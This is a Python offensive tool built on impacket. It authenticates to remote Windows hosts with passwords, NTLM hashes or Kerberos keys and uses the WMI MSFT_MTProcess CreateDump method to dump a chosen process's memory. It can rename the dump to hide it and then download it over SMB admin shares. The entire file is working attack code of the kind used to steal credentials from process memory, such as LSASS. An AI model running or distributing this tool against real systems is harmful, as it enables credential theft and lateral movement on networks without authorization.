
import os
import sys
import time
import tempfile
import argparse
import logging
import socket
from io import BytesIO
from collections import OrderedDict
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom.wmi import DCERPCSessionError
from impacket.dcerpc.v5.dcomrt import DCOMConnection, NULL
from impacket.smbconnection import SMBConnection, SessionError

class SMB:
    def __init__(self, target, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None):
        self.connection = None
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.aesKey = aesKey
        self.doKerberos = doKerberos
        self.kdcHost = kdcHost
        if hashes is not None:
            self.lmhash, self.nthash = hashes.split(':')

    def connect(self):
        try:
            self.connection = SMBConnection(self.target, self.target)
            if self.doKerberos is True:
                self.connection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey, self.kdcHost)
            else:
                self.connection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            return True
        except Exception as e:
            print(f"Failed to connect to {self.target}: {str(e)}")
            return False

    def read_file_raw(self, share, file_path):
        file_obj = BytesIO()
        self.connection.getFile(share, file_path, file_obj.write)
        return file_obj.getvalue()

class WMI:

    def __init__(self, target, namespace, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None):
        self.dcom = None
        self.iWbemServices = None
        self.target = target
        self.namespace = namespace
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.aesKey = aesKey
        self.doKerberos = doKerberos
        self.kdcHost = kdcHost
        if hashes is not None:
            self.lmhash, self.nthash = hashes.split(':')

    def connect(self):
        try:
            self.dcom = DCOMConnection(self.target, self.username, self.password, self.domain, self.lmhash, self.nthash, self.aesKey, oxidResolver=True, doKerberos=self.doKerberos, kdcHost=self.kdcHost)
            iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            self.iWbemServices = iWbemLevel1Login.NTLMLogin(self.namespace, NULL, NULL)
        except socket.error as e:
            logging.error(f"Couldn't connect {self.target}. Error: {str(e)}")
            exit(0)
        except KeyboardInterrupt:
            self.close()
            
    def get_wmi_object(self, wql):
        if not self.iWbemServices:
            raise Exception("WMI service not initialized. Call connect() first.")
        try:
            iEnumWbemClassObject = self.iWbemServices.ExecQuery(wql)
            while True:
                try:
                    objects = iEnumWbemClassObject.Next(0xffffffff, 1)
                    if len(objects) == 0:
                        break
                    for obj in objects:
                        yield obj
                except wmi.DCERPCSessionError as e:
                    if str(e).find('S_FALSE') < 0:
                        print(f"WMI query iteration error: {e}")
                    break
        except Exception as e:
            print(f"Error executing WMI query: {e}")

    def get_object(self, obj_name):
        classObject, _ = self.iWbemServices.GetObject(obj_name)
        return classObject
    
    def close(self):
        if self.iWbemServices:
            self.iWbemServices.RemRelease()
        if self.dcom:
            self.dcom.disconnect()

def process_file_data(file_data, out_file):
    location = tempfile.gettempdir()
    output = os.path.join(location, out_file)
    print(f'Writing file to {output}')
    try:
        file_length_bytes = bytes(file_data[0:4])
        file_length_bytes = file_length_bytes[::-1]
        file_length = int.from_bytes(file_length_bytes, byteorder='little', signed=False)
        file_bytes = bytes(file_data[4:file_length + 4])

        with open(output, 'wb') as f:
            f.write(file_bytes)
            
        return True
        
    except Exception as e:
        print("Error processing file data:", str(e))
        return False

def read_file(options, dump_path, out_name):
    # This likely won't work, WS-Mans default packet size is 512kb, and most memory dumps likely will be larger.
    # https://gist.github.com/mattifestation/03079a38f23e0c94c8cd39779f88adf6

    dump_path = str(dump_path)
    target_namespace = '//./root/Microsoft/Windows/Powershellv3'
    domain, username, password, address = parse_target(options.target)
    try:
        wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
        wmi.connect()
        print('Connected to psv3')
        time.sleep(5)
        try:
            print(f'Getting file {dump_path}')
            file_contents, methods = wmi.iWbemServices.GetObject(f"PS_ModuleFile.InstanceID='{dump_path}'")
            instance = file_contents.SpawnInstance()
            props = instance.getProperties()
            file_data = props['FileData']['value']
            if file_data:
                file_content = process_file_data(file_data, out_name)
                if file_content:
                    print('Success')
                else:
                    print('Failed')

        except Exception as e:
            print("An error occurred:", str(e))
    
        wmi.close()
    except Exception as e:
        print(e)
        wmi.close()

def download_over_smb(options, file_path):
    domain, username, password, address = parse_target(options.target)
    smb = SMB(address, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)

    drive, path_filename = os.path.splitdrive(file_path)
    path, filename = os.path.split(path_filename)

    local_path = os.path.join('.', filename)

    u_drive = drive.replace(':', '$')
    if smb.connect():
        print(f'  Downloading {file_path}')
        raw_data = smb.read_file_raw(u_drive, path_filename)
        with open(local_path, 'wb') as file:
            file.write(raw_data)

        print(f'File saved to {local_path}')
    return


def get_id_from_name(options):
    #TODO: Convert this from Win32_Process to MSFT_MTProcess
    process_id = None
    target_namespace = '//./root/CIMv2'
    domain, username, password, address = parse_target(options.target)
    try:
        print('Connecting to CIMv2')
        wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
        wmi.connect()

        print('  Getting pid from process name')
        try:
            iEnumWbemClassObject = wmi.iWbemServices.ExecQuery(f"Select ProcessId from Win32_Process where Name = '{options.proc}'")
            while True:
                    objects = iEnumWbemClassObject.Next(0xffffffff, 1)
                    if len(objects) == 0:
                        break
                    for obj in objects:
                        process_id = obj.getProperties()['ProcessId']['value']
                        if process_id:
                            return process_id            
        except Exception as e:
            if str(e).find('S_FALSE') < 0:
                print(e)
            return None

    except Exception as e:
        print(f"An error occured attempting to get the process ID")
        wmi.close()
        return None

# $instance = Get-WmiObject -NameSpace root\Microsoft\Windows\ManagementTools -Class MSFT_MTProcess -Filter "ProcessId=612"
# Invoke-WmiMethod -InputObject $instance -Name CreateDump
def create_dump(options):
    pid = None
    target_namespace = '//./root/Microsoft/Windows/ManagementTools'
    domain, username, password, address = parse_target(options.target)
    dump_file = None
    out_name = f'{address}-process-{pid}.dmp'
    try:
        print('Connecting to ManagementTools...')
        wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
        wmi.connect()

        try:
            if options.pid is None:
                pid = get_id_from_name(options)
                if pid is None:
                    print(f'Could not find process ID for {options.proc}, ensure the name is exact (it may need to end in .exe)')
                    wmi.close()
                    return
                print(f'  {options.proc} returned {pid}')
            else:
                pid = options.pid
                print(f'  Using process ID {options.pid}')
            
            object_path = f"MSFT_MTProcess.ProcessId={pid}"
            inParams = {}
            result = wmi.iWbemServices.ExecMethod(object_path, "CreateDump", inParams)
            
            properties = result.getProperties()
            for prop, value in properties.items():
                if str(prop).lower() == 'dumpfilepath':
                    dump_file = value['value']                    
        except DCERPCSessionError as e:
            if e.error_code == 0x80041002: # WBEM_E_NOT_FOUND
                print('Process ID does not exist')
            wmi.close()
            return None

        wmi.close()
        if dump_file:
            print(f'  Process Dump written to {dump_file} on {address}')
            
            if options.rename:
                new_name = rename_dump_file(options, dump_file)
                if new_name is not None:
                    dump_file = new_name

            if options.download:
                download_over_smb(options, dump_file)
            # downloading through WMI without an event sub is unlikely
            #read_file(options, dump_file, out_name)

    except DCERPCSessionError as e:
        if e.error_code == 0x8004100E:  # WBEM_E_INVALID_NAMESPACE
            print(f"Invalid namespace, this namespace is only valid on Windows Server 2016 and later")
            wmi.close()

def rename_dump_file(options, old_name):
    # we likely wont be connected to CIMv2
    target_namespace = '//./root/CIMv2'
    domain, username, password, address = parse_target(options.target)

    old_dir = os.path.dirname(old_name)
    old_fn = os.path.basename(old_name)
    new_name = os.path.join(old_dir, options.rename)
    oldname_escaped = old_name.replace('\\', '\\\\')
    newname_escaped = new_name.replace('\\', '\\\\')
    try:
        print('Connecting to CIMv2...')
        wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
        wmi.connect()
        print(f'Renaming {old_name} to {new_name}')
        try:
            obj, _ = wmi.iWbemServices.GetObject(f"CIM_DataFile.Name='{oldname_escaped}'")
            obj.Rename(newname_escaped)
            wmi.close()
            return new_name
        except Exception as e:
            if str(e).find('S_FALSE') < 0:
                print(e)
            return None
    except Exception as e:
        print(f"An error occured renaming file")
        wmi.close()
        return None
       
def main():
    parser = argparse.ArgumentParser(add_help=True, description="Dump processes over WMI with either PID or process name. Only worked on Windows Server 2016 and higher")
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-pid', action='store', help='process ID to dump')
    parser.add_argument('-proc', action='store', help='process name to dump')
    parser.add_argument('-rename', action='store', help='rename file after dump')
    parser.add_argument('-download', action='store_true', help='download file over SMB')
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    
    if len(sys.argv) == 1:
       parser.print_help()
       sys.exit(1)

    options = parser.parse_args()

    if options.pid is not None or options.proc is not None:
        create_dump(options)
        
    else:
        print('[!] Target process args are missing')
    

if __name__ == "__main__":
    main()
